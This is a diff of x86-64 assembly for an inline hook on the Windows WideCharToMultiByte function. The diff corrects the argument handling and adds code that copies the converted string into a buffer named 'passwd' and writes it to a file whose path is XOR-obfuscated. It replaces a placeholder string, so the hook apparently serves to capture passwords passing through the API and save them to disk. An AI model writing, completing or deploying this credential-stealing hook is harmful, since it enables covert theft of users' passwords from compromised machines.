@@ -14,14 +14,14 @@ export hook_inline_patch
 ; arg0: CodePage            rcx
 ; arg1: dwFlags             rdx
 ; arg2: ccWideChar          r8
-; arg3: lpMultiByteStr      r9
-; arg4: cbMultiByte         [rsp + 48]
-; arg5: lpDefaultChar       [rsp + 40]
-; arg6: lpUseDefaultChar    [rsp + 32]
+; arg3: lpWideCharStr       r9
+; arg4: lpMultiByteStr      [rsp + 32]
+; arg5: cbMultiByte         [rsp + 40]
+; arg6: lpDefaultChar       [rsp + 48]
+; arg7: lpUseDefaultChar    [rsp + 56]
 ;
 ; return: num bytes written rax
 hooked_wide_char_to_multibyte_inline_patch:
-int3
     push rbp
     mov rbp, rsp
 
@@ -61,10 +61,18 @@ int3
     mov [rsp + 40], rax
     mov rax, [rbp + 64]
     mov [rsp + 48], rax
+    mov rax, [rbp + 72]
+    mov [rsp + 56], rax
     call [wide_char_to_multibyte]   ; bytes written
     add rsp, 64
 
     mov [rbp - 16], rax             ; bytes written
+
+    sub rsp, 32
+    mov rcx, passwd
+    mov rdx, [rbp + 48]
+    call strcpy
+    add rsp, 32
 
     sub rsp, 32
     mov rcx, file_path_xor
@@ -92,23 +100,25 @@ int3
 
     sub rsp, 48                     ; shadow space + 1 args + 8 byte paddding
     mov rcx, [rbp - 24]
-    mov rdx, just_str
-    mov r8, just_str.len ;[rbp - 16]
+    mov rdx, passwd
+    mov r8, [rbp - 16]
     xor r9, r9
     mov qword [rsp + 32], 0
     call [write_file]
     add rsp, 48
+
+    cmp rax, 0                      ; write file failed ?
+    je .shutdown
 
     sub rsp, 32
     mov rcx, [rbp - 24]
     call [close_handle]
     add rsp, 32
 
-.shutdown:
-    sub rsp, 32
-    call [get_last_error]
-    add rsp, 32
+    cmp rax, 0                      ; close handle failed ?
+    je .shutdown
 
+.shutdown:
     add rsp, 32                     ; free local variable space
 
     leave
@@ -260,3 +270,4 @@ just_str: db 'just', 0
 section .bss
 wide_char_to_multibyte: dq ?
 original_func_bytes: resb 14
+passwd: resb 128
